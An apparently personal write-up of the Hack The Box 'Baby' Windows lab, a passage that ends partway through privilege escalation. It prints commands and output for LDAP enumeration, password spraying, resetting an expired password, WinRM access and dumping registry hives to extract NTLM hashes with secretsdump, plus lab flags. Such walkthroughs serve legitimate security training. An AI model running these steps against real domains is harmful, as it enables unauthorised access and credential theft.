---
title: 'Baby'
date: '2026-09-11'
excerpt: 'Easy - Windows (CJCA Preparation)'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Baby</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Baby is an easy difficulty Windows machine that features LDAP enumeration, password spraying and exposed credentials. For privilege escalation, the SeBackupPrivilege is exploited to extract registry hives and the NTDS.dit file. A Pass-the-Hash attack can be performed using the uncovered domain hashes ultimately achieving Administrator access.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the fully qualified domain name on Baby?</p>
<p class="mb-3">We run <code>nmap -sC -sV -A -p- -T4 [TARGET_IP]</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ nmap -sC -sV -A -p- -T4 10.129.234.71 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 09:11 EDT
Nmap scan report for 10.129.234.71
Host is up (0.29s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-10 13:20:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-10T13:21:19+00:00
|_ssl-date: 2026-09-10T13:21:59+00:00; -23h56m05s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-09-09T13:07:21
|_Not valid after:  2027-03-11T13:07:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
50178/tcp open  msrpc         Microsoft Windows RPC
50191/tcp open  msrpc         Microsoft Windows RPC
56135/tcp open  msrpc         Microsoft Windows RPC
65223/tcp open  msrpc         Microsoft Windows RPC
65231/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65232/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -23h56m05s, deviation: 0s, median: -23h56m05s
| smb2-time: 
|   date: 2026-09-10T13:21:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 380.10 seconds
```

<p class="mb-3">Notice that the Nmap scan results shows common services such as DNS (port 53), Kerberos (port 88), LDAP (port 389 and 3268), etc. Now that we know the domain name is <code>baby.vl</code> and the domain controller's full hostname is <code>BabyDC.baby.vl</code>, we add these into our <code>/etc/hosts</code> file so that our system can properly resolve the IP and communicate with the domain controller. We run <code>echo "[TARGET_IP] baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts</code>.</p>
<p class="mb-5"><strong>Answer:</strong> BabyDC.baby.vl</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> Which user has an exposed password in their LDAP description field?</p>
<p class="mb-3">Now we start off by trying to extract information we can find on the users in the domain. Using <code>ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl | grep sAMAccountName:</code> returns us a list of users by narrowing down our query only to the user objects.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl | grep sAMAccountName:
sAMAccountName: Guest
sAMAccountName: Jacqueline.Barnett
sAMAccountName: Ashley.Webb
sAMAccountName: Hugh.George
sAMAccountName: Leonard.Dyer
sAMAccountName: Connor.Wilkinson
sAMAccountName: Joseph.Hughes
sAMAccountName: Kerry.Wilson
sAMAccountName: Teresa.Bell
```

<p class="mb-3">To get a fully detailed output for each user, we run the same command <code>ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl</code> but without the <code>grep</code> filter.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl
# extended LDIF
#
# LDAPv3
# base <dc=baby,dc=vl> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121144952.0Z
whenChanged: 20211121144952.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 8197
name: Guest
objectGUID:: 8XThJOa14ESxUfIZL3Bd9A==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Jacqueline Barnett, dev, baby.vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Jacqueline Barnett
sn: Barnett
givenName: Jacqueline
distinguishedName: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Jacqueline Barnett
uSNCreated: 12793
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12798
name: Jacqueline Barnett
objectGUID:: /Lm9eucHIkS9Gr+pwGrvHA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810632000928
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Jacqueline.Barnett
sAMAccountType: 805306368
userPrincipalName: Jacqueline.Barnett@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ashley Webb, dev, baby.vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ashley Webb
sn: Webb
givenName: Ashley
distinguishedName: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Ashley Webb
uSNCreated: 12803
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12808
name: Ashley Webb
objectGUID:: P1UeCcUZGUO6xywh/3Gw/g==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810633407081
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Ashley.Webb
sAMAccountType: 805306368
userPrincipalName: Ashley.Webb@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Hugh George, dev, baby.vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Hugh George
sn: George
givenName: Hugh
distinguishedName: CN=Hugh George,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Hugh George
uSNCreated: 12813
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12818
name: Hugh George
objectGUID:: kzlvIum6eEqohHq3BwrYoA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810634363083
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Hugh.George
sAMAccountType: 805306368
userPrincipalName: Hugh.George@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Leonard Dyer, dev, baby.vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Leonard Dyer
sn: Dyer
givenName: Leonard
distinguishedName: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Leonard Dyer
uSNCreated: 12823
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12828
name: Leonard Dyer
objectGUID:: VkMQnkPgw0GAkDCiq9LOhA==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810635678033
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Leonard.Dyer
sAMAccountType: 805306368
userPrincipalName: Leonard.Dyer@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Connor Wilkinson, it, baby.vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Connor Wilkinson
sn: Wilkinson
givenName: Connor
distinguishedName: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Connor Wilkinson
uSNCreated: 12849
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12854
name: Connor Wilkinson
objectGUID:: CSm4NoxCPEGpnplkzZapcw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810684117255
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Connor.Wilkinson
sAMAccountType: 805306368
userPrincipalName: Connor.Wilkinson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Joseph Hughes, it, baby.vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joseph Hughes
sn: Hughes
givenName: Joseph
distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Joseph Hughes
uSNCreated: 12869
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12874
name: Joseph Hughes
objectGUID:: ro0OQulY1U+EZmNSj15XBw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810685992446
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Joseph.Hughes
sAMAccountType: 805306368
userPrincipalName: Joseph.Hughes@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Kerry Wilson, it, baby.vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Kerry Wilson
sn: Wilson
givenName: Kerry
distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Kerry Wilson
uSNCreated: 12879
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12884
name: Kerry Wilson
objectGUID:: vZ3N44jyakmXClchAicbbg==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810686929995
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Kerry.Wilson
sAMAccountType: 805306368
userPrincipalName: Kerry.Wilson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 13
# numEntries: 9
# numReferences: 3
```

<p class="mb-3">We discovered that the user <code>Teresa.Bell</code> has a possible default password <code>BabyStart123!</code> in the description field that we could use. We save the list of users into a <code>user.txt</code> file and try a password spray with <code>netexec</code> to see if any of the users we found are currently using this password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ vi users.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
```

<p class="mb-3">It seems that we are unsuccessful this time, so we might be missing some more things.</p>
<p class="mb-5"><strong>Answer:</strong> Teresa.Bell</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> Which user account must have its expired password reset before logging in?</p>
<p class="mb-3">The next step is to search for all the objects on the domain wile using <code>grep</code> to view only the object's <code>Distinguished Name</code>. This allows us to see the Common Name (CN) and Container (CN) of the object as well as any Organisational Units (OU) it may belong to and finally the Domain Components (DC).</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ ldapsearch -x -b "dc=baby, dc=vl" "*" -H ldap://BabyDC.baby.vl | grep dn
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

<p class="mb-3">These results show some names that did not show up as user objects but belong to OUs like <code>dev</code> and <code>it</code>. The extra names are <code>Ian.Walker</code> and <code>Caroline.Robinson</code>. We update the <code>users.txt</code> file from earlier by adding their names to our list and trying the password spray again.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
LDAP        10.129.234.71   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
LDAP        10.129.234.71   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

<p class="mb-3">We see that <code>Caroline.Robinson</code> is using the default password we found. But the password is expired and we will have to set a new password if we want to access this account. We can use <code>smbpasswd -U BABY/caroline.robinson -r baby.vl</code>. Enter <code>BabyStart123!</code> for the old SMB password, and enter a suitable password as the new SMB password (I used <code>NewPassword123!</code>).</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ smbpasswd -U BABY/caroline.robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user caroline.robinson
```

<p class="mb-5"><strong>Answer:</strong> Caroline.Robinson</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> Submit the flag located on the Caroline.Robinson user's desktop.</p>
<p class="mb-3">We run <code>evil-winrm -i baby.vl -u caroline.robinson -p NewPassword123!</code> to connect to the target machine.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ evil-winrm -i baby.vl -u caroline.robinson -p NewPassword123!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls -Recurse
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> ls -Recurse


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/10/2026   1:08 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat user.txt
a96683987eefceab0d71f51d3cb69c17
```

<p class="mb-5"><strong>Answer:</strong> a96683987eefceab0d71f51d3cb69c17</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What dangerous privilege does the Caroline.Robinson user have associated with their account?</p>
<p class="mb-3">To check for privesc opportunities, we first start off by running <code>whoami /priv</code>.</p>

```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

<p class="mb-3">Notice how the privileges <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> appeared in the output. These privileges are usually given to users in the <code>Backup Operators</code> group. If we run <code>whoami /groups</code>, it confirms that <code>Caroline.Robinson</code> is part of this group.</p>

```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

<p class="mb-3">The <code>SeBackupPrivilege</code> allows us to create backups of registry hive files which once cracked will reveal important information such as user <code>NTLM</code> hashes.</p>
<p class="mb-5"><strong>Answer:</strong> SeBackupPrivilege</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Which file contains encrypted user domain hashes?</p>
<p class="mb-3">To be specific, we need the <code>SAM</code> and <code>SYSTEM</code> hives. <code>SAM</code> stores local account metadata and the hashed credentials (<code>NTLM</code> hashes) for local users on the machine. While <code>SYSTEM</code> contains the information needed to derive the boot key which is needed to decrypt the <code>SAM</code> hive. We start by creating backups in the current directory.</p>

```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam .\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system .\system
The operation completed successfully.
```

<p class="mb-3">Now we can download both of them to our local machine using Evil-WinRM's <code>download</code> function.</p>

```console
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download sam
                                        
Info: Downloading C:\Users\Caroline.Robinson\Documents\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> download system
                                        
Info: Downloading C:\Users\Caroline.Robinson\Documents\system to system
                                        
Info: Download successful!
```

<p class="mb-3">We run <code>impacket-secretsdump -sam sam -system system LOCAL</code> to extract the user hashes.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ ls
cacert.der  Desktop  Documents  Downloads  Music  my_data  Pictures  sam  system  Templates  users.txt  Videos
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
└──╼ [★]$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

<p class="mb-3">Using the Administrator hash <code>8d992faed38128ae85e95fa35868bb43</code> to log in via Evil-WinRM was not successful.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-03vo5mqjta]─[~]
